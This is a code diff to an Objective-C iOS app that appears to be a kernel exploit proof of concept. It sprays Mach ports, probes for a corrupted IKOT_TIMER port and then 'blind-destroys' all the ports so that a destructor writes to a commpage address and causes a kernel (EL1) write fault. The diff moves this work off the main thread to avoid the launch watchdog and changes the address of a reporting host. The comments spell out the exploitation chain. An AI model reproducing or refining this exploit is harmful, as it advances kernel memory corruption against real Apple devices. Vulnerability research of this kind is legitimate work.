@@ -35,7 +35,7 @@
 #define COMMPAGE_TARGET      0x0000000FFFFFC330ULL
 #define COMMPAGE_TARGET_KERN 0xFFFFFE00FFFFC330ULL
 #define IKOT_TIMER           27
-#define REPORT_HOST          "192.168.68.109"
+#define REPORT_HOST          "192.168.68.106"
 #define PROBE_INTERVAL_S     1
 
 static mach_port_t g_ports[NUM_PORTS];
@@ -202,41 +202,45 @@ static void scan_background(void) {
     [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
     g_webView = self.reportView;
 
-    spray();
+    /* Move spray + probe setup to background so main thread returns in <1s.
+     * Prevents the iOS 20s process-launch watchdog (0x8BADF00D) from killing
+     * the app before blind_destroy fires at T+170s. */
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        spray();
 
-    /* Launch probe thread.
-     * Every 5s: scan for kotype=27 (IKOT_TIMER) OR kobject=COMMPAGE_TARGET.
-     * Corrupted TIMER port: mach_port_mod_refs(-1) -> io_refs 1->0 -> clock cleanup
-     *   -> store to COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS */
-    pthread_t probe_thread;
-    pthread_create(&probe_thread, NULL, probe_loop, NULL);
-    pthread_detach(probe_thread);
+        /* Launch probe thread — scans for corrupted TIMER port. */
+        pthread_t probe_thread;
+        pthread_create(&probe_thread, NULL, probe_loop, NULL);
+        pthread_detach(probe_thread);
 
-    ev("V18P_LAUNCH AllocatorProbe v18_probe N=%d probe-interval=%ds TIMER-kotype=%d",
-       g_port_count, PROBE_INTERVAL_S, IKOT_TIMER);
+        ev("V18P_LAUNCH AllocatorProbe v18_probe N=%d probe-interval=%ds TIMER-kotype=%d",
+           g_port_count, PROBE_INTERVAL_S, IKOT_TIMER);
 
-    self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
-                                                      target:self
-                                                    selector:@selector(scanTick:)
-                                                    userInfo:nil repeats:YES];
+        /* NSTimer must be scheduled on the main run loop. */
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
+                                                              target:self
+                                                            selector:@selector(scanTick:)
+                                                            userInfo:nil repeats:YES];
+        });
 
-    /* Blind-destroy after 170s: mach_port_kobject() is sanitized on iOS 26,
-     * so detection never fires. Drop all spray ports unconditionally — any
-     * corrupted IKOT_TIMER port will dispatch its destructor -> commpage write
-     * -> EL1 fault -> qualifying IPS. */
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
-                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        ev("BLIND_DESTROY_START n=%d", g_port_count);
-        int destroyed = 0;
-        for (int i = 0; i < g_port_count; i++) {
-            if (g_ports[i] != MACH_PORT_NULL) {
-                mach_port_mod_refs(mach_task_self(), g_ports[i],
-                                   MACH_PORT_RIGHT_RECEIVE, -1);
-                g_ports[i] = MACH_PORT_NULL;
-                destroyed++;
+        /* Blind-destroy after 170s from spray completion: drop all spray ports
+         * unconditionally — any corrupted IKOT_TIMER port dispatches its
+         * destructor -> commpage write -> EL1 fault -> qualifying IPS. */
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
+                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            ev("BLIND_DESTROY_START n=%d", g_port_count);
+            int destroyed = 0;
+            for (int i = 0; i < g_port_count; i++) {
+                if (g_ports[i] != MACH_PORT_NULL) {
+                    mach_port_mod_refs(mach_task_self(), g_ports[i],
+                                       MACH_PORT_RIGHT_RECEIVE, -1);
+                    g_ports[i] = MACH_PORT_NULL;
+                    destroyed++;
+                }
             }
-        }
-        ev("BLIND_DESTROY_DONE destroyed=%d — listen for EL1 fault", destroyed);
+            ev("BLIND_DESTROY_DONE destroyed=%d — listen for EL1 fault", destroyed);
+        });
     });
 
     return YES;
